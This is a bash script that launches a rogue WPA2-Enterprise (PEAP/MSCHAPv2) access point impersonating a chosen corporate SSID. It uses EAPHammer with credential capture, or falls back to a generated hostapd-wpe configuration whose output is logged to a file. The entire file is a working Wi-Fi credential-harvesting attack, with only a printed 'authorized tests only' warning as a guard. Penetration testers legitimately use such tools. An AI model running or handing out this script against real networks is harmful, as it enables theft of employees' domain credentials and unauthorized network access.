#!/usr/bin/env bash
# enterprise_quick_wlan1.sh — Rogue 802.1X (PEAP/MSCHAPv2) quick launcher
# Usage:
#   sudo ./enterprise_quick_wlan1.sh <CH> "<CORP_SSID>"
set -Eeuo pipefail
CH="${1:?Usage: sudo $0 <CHANNEL> \"<CORP_SSID>\"}"
ESSID="${2:?Usage: sudo $0 <CHANNEL> \"<CORP_SSID>\"}"
IFACE="${IFACE:-wlan1}"

echo "[!] AUTHORIZED TESTS ONLY! This will start a rogue 802.1X AP for capture."

need() { command -v "$1" >/dev/null 2>&1 || return 1; }
if need eaphammer; then
  echo "[*] Using EAPHammer"
  sudo ip link set "$IFACE" down
  sudo iw dev "$IFACE" set type managed
  sudo ip link set "$IFACE" up
  sudo eaphammer --interface "$IFACE" --channel "$CH" --essid "$ESSID" --auth wpa-eap --creds
  exit 0
fi

if command -v hostapd-wpe >/dev/null 2>&1; then
  echo "[*] Using hostapd-wpe (manual conf)"
  CONF="$HOME/wifi/hostapd-wpe_${ESSID// /_}.conf"
  mkdir -p "$HOME/wifi/logs"
  cat > "$CONF" <<EOF
interface=$IFACE
driver=nl80211
ssid=$ESSID
channel=$CH
ieee8021x=1
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
EOF
  sudo hostapd-wpe "$CONF" | tee "$HOME/wifi/logs/hostapd-wpe_$(date +%F_%H%M%S).log"
  exit 0
fi

echo "[!] Neither eaphammer nor hostapd-wpe installed."
echo "    Install with: sudo apt install eaphammer hostapd-wpe"
exit 1
